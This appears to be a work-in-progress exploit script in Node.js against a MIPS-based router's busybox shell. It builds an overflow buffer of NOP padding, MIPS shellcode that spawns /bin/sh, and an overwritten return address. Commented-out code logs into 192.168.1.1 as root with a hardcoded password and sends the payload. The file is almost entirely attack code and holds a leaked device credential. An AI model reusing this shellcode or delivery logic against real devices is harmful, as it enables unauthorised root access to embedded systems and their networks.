/// <reference types="node" />
const net = require("node:net");
// call with `ls -$(cat payload.txt)`
const cmdPrefixLength = "ls -".length

// JUNK + Jump address (RA)
const payload = Buffer.alloc(4141 + 4, 0x55 /** NOP */)
//payload.write("ls '-", 0)

// https://www.eg.bucknell.edu/~csci320/mips_web/
/**
 * Avoid null byte 0x00 and single-quote 0x27
 * Todo: remove 0x45 at upper byte to get jump
 */
// payload.write(
//     "\x35\x08\x43\x1e" + //  ori     t0,t0,0x431e
//     "\x02\x08\x41\x40" + //  sll     t0,t0,5
//     "\x02\x08\x40\xc0" + //  sll     t0,t0,3
//     "\x35\x08\x1e\x78" + //  ori     t0,t0,0x1e78
//     "\x01\x01\x80\x08" , //  jr t0
//     5, 'binary')

// payload.write(
//     "\x35\x08\x43\xdc" + //        ori     t0,t0,0x43dc
//     "\x02\x08\x41\x40" + //        0x2084140
//     "\x02\x08\x40\xc0" + //        0x20840c0
//     "\x35\x08\xdc\xbc" + //        ori     t0,t0,0xdcbc
//     "\x01\x01\x80\x08" + //        0x1018008
//     "\x01\x01\x01\x01", //        (nop)
//     4, 'binary')

// https://fireshellsecurity.team/writing-a-shellcode-for-mips32/
payload.write(
    "\x3c\x0f\x2f\x2f" + //        lui     t7,0x2f2f
    "\x35\xef\x62\x69" + //        ori     t7,t7,0x6269
    "\x3c\x0e\x6e\x2f" + //        lui     t6,0x6e2f
    "\x35\xce\x73\x68" + //        ori     t6,t6,0x7368
    "\xaf\xaf\xff\xf4" + //        sw      t7,-12(sp)
    "\xaf\xae\xff\xf8" + //        sw      t6,-8(sp)
    "\xaf\xa0\xff\xfc" + //        sw      zero,-4(sp)
    "\x03\xbd\x60\x25" + //        or      t4,sp,sp
    "\x25\x84\xff\xf4" + //        addiu   a0,t4,-12
    "\x28\x05\xff\xff" + //        slti    a1,zero,-1
    "\x28\x06\xff\xff" + //        slti    a2,zero,-1
    "\x24\x02\x0f\xab" + //        li      v0,4011
    "\x01\x01\x01\x4c", //        syscall 0x40405
    0, 'binary')

// PC/RA
//const pc = `\x00\x43\x1e\x78`
//const pc = `\x40\x7f\xed\x5f`
// const pc = `\x40\x7f\xed\x17` // paramstack + 3 (sh<space>)

// Jump to our payload ? got illegal instruction
payload.writeUInt32BE(0x407fed5c + cmdPrefixLength, 4140)
// jump to exit
//pc.writeUInt32BE(0x3fe7da30)

//0x407ff928 --> inject on ash_write_log


// /** @type {net.Socket} */
// let sock

// try {
//     sock = net.connect({
//         host: '192.168.1.1',
//         port: 22
//     });
// } catch (error) {
//     return j(error)
// }
// sock.setEncoding('binary')
// sock.once('connect', () => {
//     console.log('Connected');
//     //sock.write("\xFF\xFC\x00", 'binary');    // IAC
//     // sock.write();    // WILL
//     // sock.write();    // ECHO
//     sock.write("root\nklampok\n")
//     sent = 1
// })
// sock.once('close', (err) => {
//     console.error('Closed', err)
//     process.exit()
// })
// let sent = 0
// sock.on('data',
//     /** @param {string} data */
//     (data) => {
//         //console.log('**', data.replace(/[^\x20-\x7E]+/g,'-'));
//         process.stdout.write(data, 'binary')
//         if (data.includes('#')) {
//             if (sent == 1) {
//                 sent++
//                 sock.write(Buffer.concat([
//                     payload,
//                     pc
//                 ]), "binary")
//                 sock.write("'\n\n")
//                 // let buf = Buffer.alloc(200)
//                 // buf.forEach((v, i) => buf[i] = i+1)
//                 // //console.log(buf);
//                 // sock.write("START", () =>
//                 //     //sock.write(buf, 'binary', () =>
//                 //         sock.write("END\n")
//                 //         //)
//                 // )


//                 sock.write(
//                     "ls 'A\xfd\xfc\x01Z'\n",
//                     'binary'
//                 )
//             }
//             // else if(!sent2){
//             //     sent2 = true
//             //     sock.write("\t\nbusybox ffg\n")
//             // }
//         }
//     })

// process.once('SIGUSR2', (s) => {
//     process.exit()
// })

// to stdout
process.stdout.write(payload, "binary")


// nodemon --delay 100ms -w exploit.js exploit.js